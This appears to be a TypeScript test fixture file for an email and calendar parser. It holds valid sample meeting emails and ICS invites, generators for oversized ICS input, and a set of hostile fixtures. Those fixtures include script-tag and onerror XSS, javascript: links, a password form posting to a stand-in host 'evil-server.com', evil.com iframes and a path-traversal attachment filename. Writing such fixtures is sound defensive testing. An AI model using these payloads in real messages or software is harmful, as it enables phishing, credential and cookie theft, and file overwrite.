import { EmailData } from "../types";

/**
 * Valid sample emails with meeting details
 */
export const validEmails: EmailData[] = [
  {
    id: "email_1",
    subject: "Urgent: Project Kickoff Sync",
    from: "pm@company.com",
    to: ["dev1@company.com", "dev2@company.com"],
    body: "Hi Team,\nLet's schedule a kickoff sync for the new dashboard tool on 2026-07-10 at 10:00 AM UTC. Please accept this placeholder. Zoom link is https://zoom.us/j/123456789",
    hasAttachments: false,
  },
  {
    id: "email_2",
    subject: "Sprint Planning Invitation",
    from: "scrum@company.com",
    to: ["dev1@company.com", "dev2@company.com"],
    body: "Please join the sprint planning session. We will cover sprint scope.\n\nDate: 2026-07-12\nTime: 14:00 UTC\nLocation: Google Meet",
    hasAttachments: true,
    attachments: [
      {
        filename: "planning_invite.ics",
        mimeType: "text/calendar",
        sizeBytes: 380,
        content: `BEGIN:VCALENDAR
VERSION:2.0
PRODID:-//Example Corp//Scheduler//EN
BEGIN:VEVENT
UID:uid_sprint_plan_2026
SUMMARY:Sprint Planning
DTSTART:20260712T140000Z
DTEND:20260712T153000Z
LOCATION:Google Meet Link
DESCRIPTION:Sprint planning and resource estimation.
ORGANIZER;CN=Scrum Master:mailto:scrum@company.com
ATTENDEE;CN=Developer 1:mailto:dev1@company.com
ATTENDEE;CN=Developer 2:mailto:dev2@company.com
END:VEVENT
END:VCALENDAR`,
      },
    ],
  },
];

/**
 * Malicious email and calendar fixtures containing safety/security threats
 */
export const maliciousEmails: EmailData[] = [
  {
    id: "xss_email",
    subject: "Important Team Meeting <script>alert('xss')</script>",
    from: "attacker@malicious.com",
    to: ["victim@company.com"],
    body: `<h3>Agenda: Salary Review</h3>
           <p>Click below to verify details:</p>
           <form action="http://evil-server.com/steal" method="POST">
             <input type="text" name="password" placeholder="Enter corporate password" />
             <button type="submit" onclick="alert('clicked')">Submit</button>
           </form>
           <iframe src="http://evil.com/phishing-frame"></iframe>
           <img src="x" onerror="console.log('xss-run')">
           <a href="javascript:alert('injected-js')">Click Here for Location</a>
           <p>Time is 2026-08-01.</p>`,
    hasAttachments: false,
  },
  {
    id: "malicious_ics_attachment",
    subject: "Calendar Sync Invitation",
    from: "attacker@malicious.com",
    to: ["victim@company.com"],
    body: "See the attached meeting files.",
    hasAttachments: true,
    attachments: [
      {
        // Path traversal attempt in filename
        filename: "../../../malicious_file.ics",
        mimeType: "text/calendar",
        sizeBytes: 1500,
        content: `BEGIN:VCALENDAR
VERSION:2.0
BEGIN:VEVENT
UID:xss_event_ics
SUMMARY:Click me! <script>alert(document.cookie)</script>
DTSTART:20260810T120000Z
DTEND:20260810T130000Z
LOCATION:Conference Room <iframe src='http://evil.com'></iframe>
DESCRIPTION:Details are located at javascript:alert('exploit') and also style="background-image: url('http://evil.com/xss')"
ORGANIZER;CN=Hacker:mailto:attacker@malicious.com
END:VEVENT
END:VCALENDAR`,
      },
    ],
  },
];

/**
 * Generates an excessively large ICS file content to test performance limits
 */
export function generateLargeIcsContent(eventCount: number): string {
  let content = "BEGIN:VCALENDAR\nVERSION:2.0\nPRODID:-//Limit Test//EN\n";
  for (let i = 0; i < eventCount; i++) {
    content += `BEGIN:VEVENT\n`;
    content += `UID:event_limit_test_${i}\n`;
    content += `SUMMARY:Performance Test Event ${i}\n`;
    content += `DTSTART:20260901T090000Z\n`;
    content += `DTEND:20260901T100000Z\n`;
    content += `DESCRIPTION:This is the description for performance test event number ${i}.\n`;
    content += `LOCATION:Virtually Extracted\n`;
    content += `ORGANIZER;CN=Tester:mailto:tester@test.com\n`;
    content += `END:VEVENT\n`;
  }
  content += "END:VCALENDAR";
  return content;
}

/**
 * Generates an ICS line that exceeds maximum line limits
 */
export function generateOverlyLongLineIcs(): string {
  const longProperty = "A".repeat(5000);
  return `BEGIN:VCALENDAR
VERSION:2.0
BEGIN:VEVENT
UID:long_line_event
SUMMARY:Long Line Test
DTSTART:20260910T090000Z
DTEND:20260910T100000Z
DESCRIPTION:${longProperty}
END:VEVENT
END:VCALENDAR`;
}
